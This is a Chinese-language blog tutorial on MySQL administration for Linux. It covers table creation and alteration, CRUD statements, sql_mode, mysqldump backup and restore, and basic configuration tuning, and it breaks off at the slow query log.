<ul>
<li><h5 id="数据库中表相关语句"><a href="#数据库中表相关语句" class="headerlink" title="数据库中表相关语句"></a>数据库中表相关语句</h5></li>
</ul>
<p>&emsp;&emsp;列出所有表：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/35.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">show <span class="hljs-built_in">table</span> <span class="hljs-built_in">status</span>\G;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/36.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;这里需要注意的是table后面不加s了，使用上述命令查看的表信息包括每张表的名称，所使用的存储引擎，版本，字符集，描述信息，创建时间等信息，当我们指向查看库中的某个表的状态的时候就可以使用到like命令：</p>
<center><img src="/img/Linux运维——Mysql（二）/37.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;注意，这里的like是完全匹配，接下来就是查看表结构的对应语句：</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">desc emo1<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/38.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;查看表给创建时对应的sql语句：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> <span class="hljs-built_in">table_name</span>;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/39.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;创建表的内容有比较多中情况，可以是直接创建一个新的空，或者是从数据库中查询出来的数据填充到创建的新表，亦或者是复制一个原有的表并剪贴出一个新表，但是整体结构肯定是基本不变的，首先我们查看help的帮助，获取相关命令的信息</p>
<center><img src="/img/Linux运维——Mysql（二）/40.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;可以看到，表的创建语法介绍是比较多的，接下来就是逐步进行相关的解析，对于创建表尔雅你，我们可以将语法分为两个部分，上半部分就是创建表的表明和相关信息，内容和创建库的信息是基本你一直的，后半部分这是表的内容，其中的create_definition是需要被括号括起来，其定义有三类别，分别是字段定义、表级别约束定义以及索引定义</p>
<center><img src="/img/Linux运维——Mysql（二）/41.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;举个例子：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> school(<br>school_id <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> auto_increment <span class="hljs-keyword">primary</span> key,<br>school_name <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>) ,<br>school_addr <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>)<br>)；<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/42.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;这里需要注意的是在最后一个列类型的创建时，末尾是不需要加入逗号的，所以培训文档中的语句有点小错误，school_addr varchar(50)后不加逗号，否则是报错的，好咧，接下来另外两种刚刚提到的创建表的操作了，首先是从其他数据查询后创建出一个新的数据表：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">desc</span> test2;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> test1 <span class="hljs-keyword">select</span> id,<span class="hljs-type">name</span> <span class="hljs-keyword">from</span> test2;<br><span class="hljs-keyword">desc</span> test1;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/43.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;而复制一个表其实就是其他数据查询后创建出一个新的数据表的最终版，只需要将数据修改为全部即可</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">desc</span> test1;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> test3 <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test1;<br><span class="hljs-keyword">desc</span> test3;<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;这里就不就行相关展示了，反馈和第二种情况是一样的，接下来就是对于库的删除和修改问题，首先是删除表，表的删除可以是指定的单张表，也可以是用逗号隔开的多张表</p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-keyword">drop</span> <span class="hljs-built_in">table</span> school<br><span class="hljs-keyword">drop</span> <span class="hljs-built_in">table</span> emo1<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/44.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;对于表的修改，主要是使用alter进行相关的修改，这里就不进行相关演示，给出案例代码即可：</p>
<p>&emsp;&emsp;修改表名</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> test1 <span class="hljs-keyword">rename</span> <span class="hljs-keyword">as</span> test2;<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;为表添加字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> test1 <span class="hljs-keyword">add</span> <span class="hljs-keyword">column</span> age <span class="hljs-type">int</span>;<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;为表添加字段，同时为添加的字段设定相应的约束：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> test1 <span class="hljs-keyword">add</span> <span class="hljs-keyword">column</span> age <span class="hljs-type">int</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">default</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;为表删除字段</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> test1 <span class="hljs-keyword">drop</span> stuname;<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;重命名字段，修改字段名称</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> test1 change <span class="hljs-type">name</span> name1 <span class="hljs-type">char</span>(<span class="hljs-number">5</span>);<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;将test1表中的name字段重命名为name1，name字段的数据类型为char（5），需要注意的是即使只是重命名，也需要在新名称后指定原字段的数据类型，否则mysql就会报错</p>
<ul>
<li><h5 id="数据库中的增删改查"><a href="#数据库中的增删改查" class="headerlink" title="数据库中的增删改查"></a>数据库中的增删改查</h5></li>
</ul>
<h6 id="1）insert"><a href="#1）insert" class="headerlink" title="1）insert"></a>1）insert</h6><p>&emsp;&emsp;mysql数据库中的增语句一般都是使用insert，insert的雨具语法如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">insert</span> into tablename （字段<span class="hljs-number">1</span>名称,字段<span class="hljs-number">2</span>名称,…）<br><span class="hljs-attribute">values</span>（字段<span class="hljs-number">1</span>值,字段<span class="hljs-number">2</span>值,…）<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;比如，接下来向表test中插入id为1，name为Tom的数据</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> test (id,<span class="hljs-type">name</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,‘Tom’);<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;有或者是插入多条数据，以逗号作为分割即可</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> test (id,<span class="hljs-type">name</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">2</span>,‘li’),(<span class="hljs-number">3</span>,’hang’);<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/45.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;如果是对应每一个字段进行插入，也可以不指定字段</p>
<center><img src="/img/Linux运维——Mysql（二）/46.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;当然，除了这种插入办法，还有便是使用insert与set结合的办法，其对应的语法是：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">insert</span> into tablename <br><span class="hljs-attribute">set</span> 字段<span class="hljs-number">1</span>名称=字段<span class="hljs-number">1</span>值,字段<span class="hljs-number">2</span>名称=字段<span class="hljs-number">2</span>值<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;举个例子，依旧是test的测试表，我们插入对应的值</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> test <span class="hljs-keyword">set</span> <span class="hljs-type">name</span>=’<span class="hljs-keyword">set</span>’,id=<span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/47.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;可以看到，与前面的values相比，区别在于字段名称与字段值是否分开，set的方式是将字段和字段值放在一起，除此之外，可以看到我使用set的时候，字段的顺序是可以不同的，而在values中，字段是必须按表中的顺序的</p>
<p>&emsp;&emsp;添加的雨具介绍到这，需要提及的一点是mysql默认的sqlmode为宽松模式，这意味着即使插入的数据并不是完全符合数据类型的要求，也有可能也能插入数据，如果我们想要就需要修改对应的模式：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">STRICT_TRANS_TABLES</span>：启用严格模式，要求所有插入和更新操作都必须符合列定义中指定的数据类型和长度。<br><span class="hljs-attribute">NO_ZERO_IN_DATE</span>：禁止在日期或时间字段中使用“<span class="hljs-number">0000</span>-<span class="hljs-number">00</span>-<span class="hljs-number">00</span>”或“<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>”的值。<br><span class="hljs-attribute">ONLY_FULL_GROUP_BY</span>：要求GROUP BY子句中的每个列都必须出现在SELECT列表中，或者是聚合函数的参数。<br><span class="hljs-attribute">ERROR_FOR_DIVISION_BY_ZERO</span>：启用除以零错误检查，如果除数为零，则会引发错误。<br><span class="hljs-attribute">ANSI_QUOTES</span>：启用ANSI SQL标准中的双引号作为标识符引用符号。<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;而我们可以通过使用set语句来设置sql_mode变量：</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">set sql_mode</span> = <span class="hljs-string">&#x27;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE&#x27;</span>;<br></code></pre></td></tr></table></figure>

<h6 id="2）delete"><a href="#2）delete" class="headerlink" title="2）delete"></a>2）delete</h6><p>&emsp;&emsp;接下来就是删除语句，mysql中的删除语句比较简单，基本主要通过where进行定位删除的相关内容，而where的使用在后续的select中会广泛提到，接下来主要展示是几种删除的情况，第一种极速直接删除表的所有数据，也就是清空数据的操作</p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> test<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/48.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;然后是删除使用where给定条件下的相关数据</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id=<span class="hljs-number">2</span>;<br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> rlike <span class="hljs-string">&#x27;^h.*&#x27;</span>;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/49.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;这里需要提及一个就是</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rlike</span> <span class="hljs-string">&#x27;^h.*&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;rlike是一个正则表达式匹配运算符，它可以在WHERE子句中使用。’^h.*’表示以字母“h”开头的任何字符串</p>
<h6 id="3）update"><a href="#3）update" class="headerlink" title="3）update"></a>3）update</h6><p>&emsp;&emsp;修改数据的语句本质上也比较简单，和删除delete相似，通过where进行给定修改范围，需要注意的是在执行更新语句之前要确定给定的条件是正确的，因为不加任何条件的更新语句表示更新表中的所有字段，这是比较危险的。</p>
<p>&emsp;&emsp;将test表中的所有id字段的值都修改为了1</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">update test <span class="hljs-built_in">set</span> <span class="hljs-attribute">id</span>=1;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/50.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;第二种是将表中id为3的值将名字修改为who</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">update test <span class="hljs-built_in">set</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;who&#x27;</span> where <span class="hljs-attribute">id</span>=3;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/51.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;对于多个字段的修改，使用逗号隔开即可，例如</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">update test <span class="hljs-built_in">set</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;who&#x27;</span>,age=25 where <span class="hljs-attribute">id</span>=3;<br></code></pre></td></tr></table></figure>

<h6 id="4）select"><a href="#4）select" class="headerlink" title="4）select"></a>4）select</h6><p>&emsp;&emsp;由于时间有限，这里仅仅展示select的基本用法，后续的分组，聚合多表查询后期补上，首先就是查询表汇总的所有数据</p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test;<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;查询数据后仅显示前三行</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;使用where进行条件筛选</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id = <span class="hljs-number">4</span>;<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;使用模糊查询</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;h%&#x27;</span>;<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/52.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;</p>
<h4 id="4-数据库中的数据备份及恢复"><a href="#4-数据库中的数据备份及恢复" class="headerlink" title="4.数据库中的数据备份及恢复"></a>4.数据库中的数据备份及恢复</h4><p>&emsp;&emsp;首先明确，备份数据的最终目的是为了在出现一些意外情况的时，能够通过备份将数据还原，所以在备份数据库时，除了备份数据本身以外，也要注意到备份相关的数据库性感环境，如配置文件，定时任务，sudo权限等相关信息，这里需要明确几个备份概念</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs">热备：<br>在数据库正常运行的情况下进行备份，也就是说，在热备期间，数据库的读写操作均可正常进行，所以，热备份不能只依靠简单的拷贝命令，而是需要专门的备份工具，而且技术复杂程度较高，mysql中的myisam存储引擎不支持热备，InnoDB存储引擎支持热备<br><br>温备：<br>如果使用温备的方式对数据库进行备份，在温备期间，数据库只能进行读操作，不能进行写操作，即数据库在可读但不可写的状态下进行备份。<br><br>冷备：<br>在冷备期间，数据库的读写操作均不可进行，即读写操作均不可进行的状态下所做的备份被称为冷备。冷备虽然会影响数据库的运行，但是备份出的数据的可靠性是最高的，冷备的备份过程往往是最简单的，mysql中，可能会通过复制结构去做冷<br><br>完全备份：<br>将数据库中的数据及所有对象全部进行备份，<br><br>表备份：<br>仅将一张或多张表中的数据进行备份<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;在mysql数据库中，常见的数据备份工具有来个，一个是mysql自带的备份攻击mysqldump，一个是由Percona提供的xtrabackup，接下来主要了解mysqldump工具</p>
<ul>
<li><h5 id="mysqldump"><a href="#mysqldump" class="headerlink" title="mysqldump"></a>mysqldump</h5></li>
</ul>
<p>&emsp;&emsp;首先是mysqldump，作为mysql自带的工具，是一种逻辑备份工具，它的使用是将数据从数据库中读初，并转化为对应的sql语句，能够首先完全备份或者部分备份，使用innodb表类型的表能够使用mysqldump进行热备。使用myisam表类型的表只能够使用mysqldump进行温备。因此数据量较小时，使用mysqldump是一种不错的选择</p>
<p>&emsp;&emsp;mysqldump作为一个客户端命令，所以在使用的时候，我们需要指定连接的用户名，需要连接的数据库服务ip，以及使用-p选项提示我们输入Miami，接下来演示备份test数据库</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mysqldump</span> -uroot -proot -h<span class="hljs-number">192.168.70.176</span> test<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;正确后，就会显示如下的输出：</p>
<center><img src="/img/Linux运维——Mysql（二）/53.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;这里的输出会包含一些注释，内容是包括mysqldump的版本你，mysql的版本，主机ip以及数据库对应的相关信息，值得一提的是，他会提供一些注释符号内容：</p>
<center><img src="/img/Linux运维——Mysql（二）/54.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;以第一条注释为例，40101表示MySQL版本号，如果当前版本大于等于40101，则执行SET语句。在这个例子中，SET character_set_client = @saved_cs_client表示将客户端字符集设置为之前保存的@saved_cs_client变量的值。这个变量通常用于在执行某些操作之前保存原始的客户端字符集，以便在操作完成后恢复它，当然这些注释语句不必在意，我们需要看的是转化为sql语句的部分</p>
<center><img src="/img/Linux运维——Mysql（二）/55.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;test库的test表中，将其内容的所有数据转化为 insert语句，重要我们执行就能够还原test表的所有内容，当然，既然产出了西瓜你的语句，那么存放的位置在哪就需要我们使用&gt;符号进行一个指定：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">mysqldump -uroot -proot -h192.<span class="hljs-number">168.70</span>.<span class="hljs-number">176</span> test &gt; <span class="hljs-regexp">/usr/</span>data/test.sql<br>cat <span class="hljs-regexp">/usr/</span>data/test.sql<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/56.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;</p>
<center><img src="/img/Linux运维——Mysql（二）/57.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;前面演示了如何进行一个完全的备份，通过分析语句我们也能够知道，其备份的本质是备份其中的表的内容，并不会生成创建test数据库的相关语句，那么接下来，就是演示如何只备份一个表：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysqldump -uroot -proot -h192.168.70.176 <span class="hljs-built_in">test</span> <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/58.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;备份多个数据库的指令也仅仅是用-databases后用逗号分割即可，这里就不进行演示了，而这里需要注意的是，如果我们使用的是</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mysqldump</span> -uroot -proot -h<span class="hljs-number">192.168.70.176</span> –databases test<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;这个命令是备份出创建test数据库的对应语句的，在某些时候，我们只是想要将数据库的表结构备份出来，不想备份数据，以便创建一个完全相同的干净数据库，那么我们可以使用如下语句备份数据库的所有表结构，如下命令表示备份zsythink数据库中的所有表的表结构，不包含表数据，不包含创建库的语句，只有创建表的语句</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mysqldump</span> -uroot –proot –h<span class="hljs-number">192.168.70.176</span> -d test <br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;前面大致讲解了如何进行表的备份操作，接下来就是表的备份数据进行恢复的操作，首先drop 掉原有的test数据库</p>
<center><img src="/img/Linux运维——Mysql（二）/59.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;接下来执行报存的sql语句即可</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">\. <span class="hljs-regexp">/usr/</span>data/test.sql<br></code></pre></td></tr></table></figure>

<center><img src="/img/Linux运维——Mysql（二）/60.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;报错了，这是由于前面提到的，如果不加上-database的话，备份的文件是不会创建相关的数据库的，所以执行是找不到数据库的，接下来就需要指定到对应的数据库即可：</p>
<center><img src="/img/Linux运维——Mysql（二）/61.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;</p>
<center><img src="/img/Linux运维——Mysql（二）/62.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
</center>

<p>&emsp;&emsp;最终还原备份成功</p>
<p>&emsp;</p>
<h4 id="5-数据库中的配置优化"><a href="#5-数据库中的配置优化" class="headerlink" title="5.数据库中的配置优化"></a>5.数据库中的配置优化</h4><p>&emsp;&emsp;数据库的配置优化主要目的是提高数据库的性能和可靠性，我们可以从多个方面对数据库进行相应的思考和操作：</p>
<ul>
<li><h5 id="调整缓存大小："><a href="#调整缓存大小：" class="headerlink" title="调整缓存大小："></a>调整缓存大小：</h5></li>
</ul>
<p>&emsp;&emsp;修改my.cnf文件：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo nano <span class="hljs-regexp">/etc/my</span>sql/my.cnf <br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;找到innodb_buffer_pool_size参数并修改为所需大小，例如：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">innodb_buffer_pool_size</span>=<span class="hljs-number">2</span>G <br></code></pre></td></tr></table></figure>

<p> &emsp;&emsp;重启MySQL服务：</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo service mysql restart</span><br></code></pre></td></tr></table></figure>

<ul>
<li><h5 id="优化索引"><a href="#优化索引" class="headerlink" title="优化索引"></a>优化索引</h5></li>
</ul>
<p>&emsp;&emsp;分析查询计划：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">EXPLAIN</span> <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">column_name</span> = <span class="hljs-string">&#x27;value&#x27;</span>; <br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;添加索引</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">INDEX</span> index_name (<span class="hljs-built_in">column_name</span>); <br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp; 删除索引</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">INDEX</span> index_name;<br></code></pre></td></tr></table></figure>

<ul>
<li><h5 id="配置日志："><a href="#配置日志：" class="headerlink" title="配置日志："></a>配置日志：</h5></li>
</ul>
<p>&emsp;&emsp;配置二进制日志：在my.cnf文件中添加以下参数：</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">log-bin</span><span class="hljs-operator">=</span>mysql-bin<br><span class="hljs-attribute">binlog-format</span><span class="hljs-operator">=</span>MIXED<br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;配置错误日志：在my.cnf文件中添加以下参数：</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">log</span>-<span class="hljs-built_in">error</span>=/<span class="hljs-built_in">var</span>/<span class="hljs-built_in">log</span>/mysql/<span class="hljs-built_in">error</span>.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>

<p>&emsp;&emsp;配置慢查询日志：在my.cnf文件中添加以下参数：</p>
